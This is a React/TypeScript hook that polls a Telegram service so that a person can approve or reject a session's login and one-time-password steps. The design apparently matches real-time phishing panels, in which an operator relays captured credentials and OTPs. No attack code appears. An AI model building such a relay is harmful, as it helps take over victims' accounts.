import { useState, useEffect, useRef } from 'react';
import { telegramService } from '../services/telegramService';

interface UseTelegramPollingProps {
  sessionId: string | null;
  targetStep: 'login' | 'otp';
  isActive: boolean;
  onApproved: () => void;
  onRejected: () => void;
}

export function useTelegramPolling({
  sessionId,
  targetStep,
  isActive,
  onApproved,
  onRejected,
}: UseTelegramPollingProps) {
  const [status, setStatus] = useState<'idle' | 'pending' | 'approved' | 'rejected'>('idle');
  const [error, setError] = useState<string | null>(null);

  const isCancelledRef = useRef(false);
  const isFinishedRef = useRef(false);

  useEffect(() => {
    if (!isActive || !sessionId) {
      isCancelledRef.current = true;
      setStatus('idle');
      return;
    }

    isCancelledRef.current = false;
    isFinishedRef.current = false;
    setStatus('pending');
    setError(null);

    // Continuous responsive polling loop without overlapping requests
    const runPollingLoop = async () => {
      while (!isCancelledRef.current && !isFinishedRef.current) {
        try {
          const result = await telegramService.pollUpdates(sessionId, targetStep);

          if (isCancelledRef.current) break;

          if (result === 'approved') {
            isFinishedRef.current = true;
            setStatus('approved');
            onApproved();
            break;
          } else if (result === 'rejected') {
            isFinishedRef.current = true;
            setStatus('rejected');
            onRejected();
            break;
          }
        } catch (err: any) {
          console.warn('Telegram polling warning:', err);
        }

        // Brief 300ms pause before next check
        if (!isCancelledRef.current && !isFinishedRef.current) {
          await new Promise((resolve) => setTimeout(resolve, 350));
        }
      }
    };

    runPollingLoop();

    return () => {
      isCancelledRef.current = true;
    };
  }, [sessionId, isActive, targetStep, onApproved, onRejected]);

  return {
    status,
    error,
  };
}
